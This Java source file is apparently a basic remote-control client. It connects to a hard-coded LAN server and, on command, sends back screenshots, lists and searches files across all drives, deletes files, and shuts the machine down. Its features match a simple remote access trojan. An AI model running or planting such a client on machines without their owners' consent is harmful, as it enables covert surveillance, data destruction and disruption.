import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;
import javax.imageio.ImageIO;

public class Client {
    public static void main(String[] args) {
        String serverIP ="192.168.1.103"; // Change to your server's IP
        serverIP = serverIP.trim();

        int port = 9999;

        try (Socket socket = new Socket(serverIP, port);
             DataInputStream dis = new DataInputStream(socket.getInputStream());
             DataOutputStream dos = new DataOutputStream(socket.getOutputStream())) {

            System.out.println("Connected to server...");

            while (true) {
                String command = dis.readUTF();

                if (command.equalsIgnoreCase("screenshot")) {
                    BufferedImage screenshot = new Robot().createScreenCapture(
                            new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                    File file = new File("screenshot.png");
                    ImageIO.write(screenshot, "png", file);

                    FileInputStream fis = new FileInputStream(file);
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        dos.write(buffer, 0, bytesRead);
                    }
                    fis.close();
                    file.delete();

                } else if (command.equalsIgnoreCase("listfiles")) {
                    String folderPath = dis.readUTF();
                    File folder = new File(folderPath);
                    if (folder.exists() && folder.isDirectory()) {
                        StringBuilder fileList = new StringBuilder();
                        for (File f : folder.listFiles()) {
                            fileList.append(f.getName()).append("\n");
                        }
                        dos.writeUTF(fileList.toString());
                    } else {
                        dos.writeUTF("Folder not found or not a directory.");
                    }

                } else if (command.equalsIgnoreCase("deletefile")) {
                    String fileName = dis.readUTF();
                    File file = new File(fileName);
                    if (file.exists() && file.delete()) {
                        dos.writeUTF("File deleted successfully.");
                    } else {
                        dos.writeUTF("File not found or could not be deleted.");
                    }

                } else if (command.equalsIgnoreCase("memory")) {
                    long total = Runtime.getRuntime().totalMemory();
                    long free = Runtime.getRuntime().freeMemory();
                    long used = total - free;
                    dos.writeUTF("Used: " + (used / 1024 / 1024) + " MB, Free: " + (free / 1024 / 1024) + " MB");

                } else if (command.equalsIgnoreCase("searchfile")) {
                    String searchName = dis.readUTF();
                    for (File root : File.listRoots()) {
                        searchRecursively(root, searchName, dos);
                    }
                    dos.writeUTF("SEARCH_DONE"); // Tell server search is done

                } else if (command.equalsIgnoreCase("shutdown")) {
                    Runtime.getRuntime().exec("shutdown -s -t 5");

                } else if (command.equalsIgnoreCase("exit")) {
                    break;
                }
            }

        } catch (IOException | AWTException e) {
            e.printStackTrace();
        }
    }

    private static void searchRecursively(File dir, String searchName, DataOutputStream dos) throws IOException {
        if (dir == null || !dir.exists() || !dir.canRead()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File file : files) {
            if (file.isDirectory()) {
                searchRecursively(file, searchName, dos);
            } else {
                if (file.getName().toLowerCase().contains(searchName.toLowerCase())) {
                    dos.writeUTF(file.getAbsolutePath()); // Send each match live
                }
            }
        }
    }
}
